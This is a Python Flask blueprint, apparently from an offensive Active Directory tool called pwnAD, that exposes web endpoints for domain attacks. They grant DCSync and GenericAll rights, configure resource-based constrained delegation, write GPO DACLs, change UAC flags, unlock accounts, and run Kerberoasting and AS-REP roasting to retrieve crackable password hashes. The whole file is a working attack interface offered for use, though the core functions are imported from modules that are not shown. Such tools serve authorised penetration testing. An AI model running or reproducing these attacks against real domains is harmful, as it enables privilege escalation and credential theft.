import logging

from flask import Blueprint, request, render_template, jsonify

from pwnAD.web.context import get_conn, base_context

attack_bp = Blueprint('attack', __name__)


def _json_response(success, message, status=200):
    return jsonify(success=success, message=message), status


@attack_bp.route('/attacks')
def attacks_view():
    ctx = base_context('attacks')
    return render_template('attacks.html', **ctx)


@attack_bp.route('/api/attack/dcsync', methods=['POST'])
def attack_dcsync():
    conn = get_conn()
    principal = request.form.get('principal', '').strip()
    if not principal:
        return _json_response(False, 'Missing principal', 400)
    try:
        from pwnAD.commands.add import dcsync
        dcsync(conn, principal)
        return _json_response(True, f'DCSync rights granted to {principal}')
    except Exception as e:
        logging.error(f"dcsync error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/dcsync/remove', methods=['POST'])
def attack_dcsync_remove():
    conn = get_conn()
    principal = request.form.get('principal', '').strip()
    if not principal:
        return _json_response(False, 'Missing principal', 400)
    try:
        from pwnAD.commands.remove import dcsync
        dcsync(conn, principal)
        return _json_response(True, f'DCSync rights removed from {principal}')
    except Exception as e:
        logging.error(f"dcsync remove error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/generic-all', methods=['POST'])
def attack_generic_all():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    principal = request.form.get('principal', '').strip()
    if not target or not principal:
        return _json_response(False, 'Missing target or principal', 400)
    try:
        from pwnAD.commands.add import genericAll
        genericAll(conn, target, principal)
        return _json_response(True, f'GenericAll granted to {principal} over {target}')
    except Exception as e:
        logging.error(f"genericAll error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/generic-all/remove', methods=['POST'])
def attack_generic_all_remove():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    principal = request.form.get('principal', '').strip()
    if not target or not principal:
        return _json_response(False, 'Missing target or principal', 400)
    try:
        from pwnAD.commands.remove import genericAll
        genericAll(conn, target, principal)
        return _json_response(True, f'GenericAll removed from {principal} over {target}')
    except Exception as e:
        logging.error(f"genericAll remove error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/rbcd', methods=['POST'])
def attack_rbcd():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    grantee = request.form.get('grantee', '').strip()
    if not target or not grantee:
        return _json_response(False, 'Missing target or grantee', 400)
    try:
        from pwnAD.commands.add import RBCD
        RBCD(conn, target, grantee)
        return _json_response(True, f'RBCD configured: {grantee} can delegate to {target}')
    except Exception as e:
        logging.error(f"RBCD error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/rbcd/remove', methods=['POST'])
def attack_rbcd_remove():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    if not target:
        return _json_response(False, 'Missing target', 400)
    try:
        from pwnAD.commands.remove import RBCD
        RBCD(conn, target)
        return _json_response(True, f'RBCD cleared for {target}')
    except Exception as e:
        logging.error(f"RBCD remove error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/gpo-dacl', methods=['POST'])
def attack_gpo_dacl():
    conn = get_conn()
    user = request.form.get('user', '').strip()
    gpo_id = request.form.get('gpo_id', '').strip()
    if not user or not gpo_id:
        return _json_response(False, 'Missing user or GPO ID', 400)
    try:
        from pwnAD.commands.add import write_gpo_dacl
        write_gpo_dacl(conn, user, gpo_id)
        return _json_response(True, f'GPO DACL written for {user} on {gpo_id}')
    except Exception as e:
        logging.error(f"GPO DACL error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/uac/add', methods=['POST'])
def attack_uac_add():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    flags = request.form.get('flags', '').strip()
    if not target or not flags:
        return _json_response(False, 'Missing target or flags', 400)
    try:
        flag_list = [f.strip() for f in flags.split(',') if f.strip()]
        from pwnAD.commands.add import uac
        uac(conn, target, flag_list)
        return _json_response(True, f'UAC flags {flag_list} added to {target}')
    except Exception as e:
        logging.error(f"UAC add error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/uac/remove', methods=['POST'])
def attack_uac_remove():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    flags = request.form.get('flags', '').strip()
    if not target or not flags:
        return _json_response(False, 'Missing target or flags', 400)
    try:
        flag_list = [f.strip() for f in flags.split(',') if f.strip()]
        from pwnAD.commands.remove import uac
        uac(conn, target, flag_list)
        return _json_response(True, f'UAC flags {flag_list} removed from {target}')
    except Exception as e:
        logging.error(f"UAC remove error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/unlock', methods=['POST'])
def attack_unlock():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    if not target:
        return _json_response(False, 'Missing target', 400)
    try:
        import ldap3
        target_dn = conn.get_dn_from_samaccountname(target, "person")
        if not target_dn:
            return _json_response(False, f'Account {target} not found')
        conn._ldap_connection.modify(target_dn, {
            'lockoutTime': [(ldap3.MODIFY_REPLACE, ['0'])]
        })
        if conn._ldap_connection.result['result'] == 0:
            return _json_response(True, f'Account {target} unlocked successfully')
        else:
            return _json_response(False, f'Failed: {conn._ldap_connection.result["description"]}')
    except Exception as e:
        logging.error(f"Unlock error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/kerberoast', methods=['POST'])
def attack_kerberoast():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    if not target:
        return _json_response(False, 'Missing target', 400)
    try:
        from ldap3.utils.conv import escape_filter_chars
        from pwnAD.lib.kerberos import kerberoast_account

        escaped = escape_filter_chars(target)
        conn._ldap_connection.search(
            conn._baseDN,
            f'(&(sAMAccountName={escaped})(servicePrincipalName=*))',
            attributes=['servicePrincipalName'])
        if not conn._ldap_connection.entries:
            return _json_response(False, f'No SPN found for {target}')
        spns = conn._ldap_connection.entries[0]['servicePrincipalName'].values
        if not spns:
            return _json_response(False, f'No SPN found for {target}')
        spn = spns[0] if isinstance(spns, list) else spns

        hash_str = kerberoast_account(conn, target, spn)
        return jsonify(success=True, message=f'TGS hash retrieved for {target}', hash=hash_str)
    except Exception as e:
        logging.error(f"Kerberoast error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/asreproast', methods=['POST'])
def attack_asreproast():
    conn = get_conn()
    target = request.form.get('target', '').strip()
    if not target:
        return _json_response(False, 'Missing target', 400)
    try:
        from pwnAD.lib.kerberos import asreproast_account

        hash_str = asreproast_account(conn, target)
        return jsonify(success=True, message=f'AS-REP hash retrieved for {target}', hash=hash_str)
    except Exception as e:
        logging.error(f"AS-REP Roast error: {e}")
        return _json_response(False, str(e))
